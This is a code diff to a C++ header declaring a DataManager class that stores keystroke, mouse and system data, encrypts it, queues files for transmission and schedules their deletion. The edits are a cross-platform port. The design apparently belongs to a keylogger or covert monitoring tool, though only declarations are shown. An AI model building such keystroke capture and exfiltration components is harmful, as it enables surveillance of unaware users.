@@ -2,11 +2,13 @@
 #define DATAMANAGER_H
 
 #include "data/KeyData.h"
+#include "utils/SystemUtils.h"
 #include "data/SystemData.h"
+#include "core/Platform.h"
 #include <string>
 #include <vector>
 #include <mutex>
-#include <chrono>
+#include <chrono>   
     
 struct MouseData;
 struct SystemEventData;
@@ -20,7 +22,7 @@ public:
     
     void AddKeyData(const KeyData& keyData);
     void AddMouseData(const MouseData& mouseData);
-    void AddSystemData(const SystemInfo& systemInfo);
+    void AddSystemData(const utils::SystemInfo& systemInfo);
     void AddSystemEventData(const SystemEventData& eventData);
     
     std::vector<uint8_t> RetrieveEncryptedData();
@@ -34,8 +36,8 @@ public:
     
 private:
     Configuration* m_config;
-    std::wstring m_storagePath;
-    std::wstring m_currentDataFile;
+    std::string m_storagePath;  // Changed from std::wstring to std::string for cross-platform
+    std::string m_currentDataFile;  // Changed from std::wstring to std::string
     size_t m_maxBufferSize;
     
     mutable std::mutex m_dataMutex;
@@ -54,17 +56,17 @@ private:
     void FlushMouseData();
     void FlushSystemData();
     void FlushSystemEvents();
-    void AppendToFile(const std::wstring& path, const std::string& data);
+    void AppendToFile(const std::string& path, const std::string& data);  // Changed parameter type
     void RotateDataFileIfNeeded();
     void RotateDataFile();
     
-    std::vector<std::wstring> GetDataFilesReadyForTransmission() const;
-    void MarkFileAsTransmitted(const std::wstring& filePath);
-    void ScheduleFileDeletion(const std::wstring& filePath, uint64_t delayMs);
+    static std::vector<std::string> GetDataFilesReadyForTransmission() ;  // Changed return type
+    static void MarkFileAsTransmitted(const std::string& filePath);  // Changed parameter type
+    static void ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs);  // Changed parameter type
     
-    std::string KeyDataToString(const KeyData& data) const;
-    std::string MouseDataToString(const MouseData& data) const;
-    std::string SystemInfoToString(const SystemInfo& info) const;
+    static std::string KeyDataToString(const KeyData& data) ;
+    static std::string MouseDataToString(const MouseData& data) ;
+    static std::string SystemInfoToString(const SystemInfo& info) ;
     std::string SystemEventToString(const SystemEventData& event) const;
     std::string GenerateBatchId() const;
 };
